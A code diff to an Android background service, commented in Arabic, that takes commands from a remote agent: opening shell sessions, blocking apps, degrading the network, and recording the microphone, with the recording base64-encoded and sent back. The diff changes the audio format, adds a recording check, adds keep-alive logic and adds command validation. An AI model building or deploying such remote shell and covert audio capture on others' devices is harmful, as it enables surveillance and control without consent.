@@ -17,6 +17,8 @@ import android.content.res.AssetFileDescriptor;
 import android.database.Cursor;
 import android.graphics.Bitmap;
 import android.graphics.BitmapFactory;
+import android.media.MediaExtractor;
+import android.media.MediaFormat;
 import android.media.MediaPlayer;
 import android.media.MediaRecorder;
 import android.net.ConnectivityManager;
@@ -392,10 +394,25 @@ public class BackgroundService extends Service {
         AgentConnectionManager manager = new AgentConnectionManager(
             this,
             this::executeCommand,
-            () -> {
-                if (!serviceStopping.get()) {
-                    running = false;
-                    stopSelf();
+            new AgentConnectionManager.ServiceHooks() {
+                @Override
+                public void onExitRequested() {
+                    if (!serviceStopping.get()) {
+                        running = false;
+                        stopSelf();
+                    }
+                }
+
+                @Override
+                public boolean shouldKeepAlive() {
+                    // يُبقي الخدمة حية فقط عند وجود مسؤولية قائمة: جلسة shell مفتوحة،
+                    // تدهور شبكة قيد الاستعادة، أو جلسة حجب مجدولة/نشطة. وإلا تتوقف
+                    // الخدمة عندما تنتقل نهاية جلسة الاتصال بشكل طبيعي.
+                    boolean shell = shellProcess != null;
+                    boolean degrade = degradationActive;
+                    boolean block = BlockSessionManager.getInstance(BackgroundService.this)
+                            .hasActiveOrScheduled();
+                    return shell || degrade || block;
                 }
             },
             agentIdentity
@@ -593,6 +610,10 @@ public class BackgroundService extends Service {
             return;
         }
         String pkg = parts[1].trim();
+        if (pkg.regionMatches(true, 0, "package:", 0, "package:".length())) {
+            // يقبل أيضاً الاسم كما يظهر في مخرجات "pm list packages".
+            pkg = pkg.substring("package:".length()).trim();
+        }
         if (!PACKAGE_NAME_PATTERN.matcher(pkg).matches()) {
             writeMessage(out, "نتيجة حظر التطبيق " + pkg + " - INVALID PACKAGE NAME: "
                     + "يلزم اسم حزمة صالح (مثال: com.google.android.youtube). "
@@ -1673,6 +1694,13 @@ public class BackgroundService extends Service {
             writeMessage(out, "أمر فارغ");
             return;
         }
+        if (cmd.trim().regionMatches(true, 0, "adb", 0, 3)
+                && (cmd.trim().length() == 3 || Character.isWhitespace(cmd.trim().charAt(3)))) {
+            writeMessage(out, "الأمر 'adb' لا ينفَّذ على الجهاز: adb أداة حاسوبية فقط "
+                    + "(رسالة 'adb: inaccessible or not found' هي رد shell الجهاز عندما لا يوجد ثنائي adb عليه). "
+                    + "نفّذ adb من الحاسوب، أو استخدم أوامر الجهاز المتاحة مثل pm/am/sh/getprop/settings.");
+            return;
+        }
 
         Process process;
         String result;
@@ -1876,14 +1904,19 @@ public class BackgroundService extends Service {
             return;
         }
 
-        // ملف مؤقت في كاش التطبيق؛ يُحذف بعد إرسال البيانات (وليس حفظاً دائماً)
-        File outputFile = new File(getCacheDir(), "rec_" + System.currentTimeMillis() + ".3gp");
+        // ملف مؤقت في كاش التطبيق؛ يُحذف بعد إرسال البيانات (وليس حفظاً دائماً).
+        // الترميز: AAC-LC داخل حاوية MPEG-4 (.m4a) بدل AMR-NB/.3gp لأن صيغة
+        // AMR غير مدعومة في معظم مشغلات الحاسوب، وللتحقق من المسار الصوتي الناتج.
+        File outputFile = new File(getCacheDir(), "rec_" + System.currentTimeMillis() + ".m4a");
         MediaRecorder recorder = Build.VERSION.SDK_INT >= Build.VERSION_CODES.S
                 ? new MediaRecorder(this) : new MediaRecorder();
         try {
             recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
-            recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
-            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
+            recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
+            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
+            recorder.setAudioSamplingRate(44100);
+            recorder.setAudioChannels(1);
+            recorder.setAudioEncodingBitRate(128000);
             recorder.setOutputFile(outputFile.getAbsolutePath());
             recorder.prepare();
             recorder.start();
@@ -1894,6 +1927,15 @@ public class BackgroundService extends Service {
             }
             recorder.release();
             recorder = null;
+
+            String diag = probeAudioTrack(outputFile);
+            Log.i(TAG, "record_audio diagnostics: " + diag
+                    + " (size=" + outputFile.length() + " bytes)");
+            if (!diag.contains("audio/")) {
+                writeMessage(out, "فشل في التسجيل: الملف الناتج لا يحتوي على مسار صوتي "
+                        + "قابل للتشغيل (" + diag + "). حاول مجدداً.");
+                return;
+            }
             writeMessage(out, "record_audio_data:" + duration + ":" + audioBase64(outputFile));
         } catch (Exception e) {
             writeMessage(out, "فشل في التسجيل: " + e.getMessage());
@@ -1909,6 +1951,42 @@ public class BackgroundService extends Service {
             if (!deleted) {
                 Log.w(TAG, "failed to delete temp recording: " + outputFile.getName());
             }
+        }
+    }
+
+    /**
+     * يفحص الملف الناتج فعل الذات ويكشف حقائق المسار الصوتي
+     * (الترميز/معدل العينات/القنوات/المدة) لتشخيص مشاكل التسجيل بدل إرسال ملف صامت.
+     */
+    private String probeAudioTrack(File file) {
+        MediaExtractor extractor = new MediaExtractor();
+        try {
+            extractor.setDataSource(file.getAbsolutePath());
+            StringBuilder diag = new StringBuilder();
+            int tracks = extractor.getTrackCount();
+            for (int i = 0; i < tracks; i++) {
+                MediaFormat format = extractor.getTrackFormat(i);
+                String mime = format.containsKey(MediaFormat.KEY_MIME)
+                        ? format.getString(MediaFormat.KEY_MIME) : null;
+                diag.append("track").append(i).append("=").append(mime == null ? "(مجهول)" : mime);
+                if (mime != null && mime.startsWith("audio/")) {
+                    if (format.containsKey(MediaFormat.KEY_SAMPLE_RATE)) {
+                        diag.append(" rate=").append(format.getInteger(MediaFormat.KEY_SAMPLE_RATE));
+                    }
+                    if (format.containsKey(MediaFormat.KEY_CHANNEL_COUNT)) {
+                        diag.append(" ch=").append(format.getInteger(MediaFormat.KEY_CHANNEL_COUNT));
+                    }
+                    if (format.containsKey(MediaFormat.KEY_DURATION)) {
+                        diag.append(" durUs=").append(format.getLong(MediaFormat.KEY_DURATION));
+                    }
+                }
+                diag.append("; ");
+            }
+            return diag.toString().trim();
+        } catch (Exception e) {
+            return "extractor failed: " + e.getMessage();
+        } finally {
+            extractor.release();
         }
     }
 
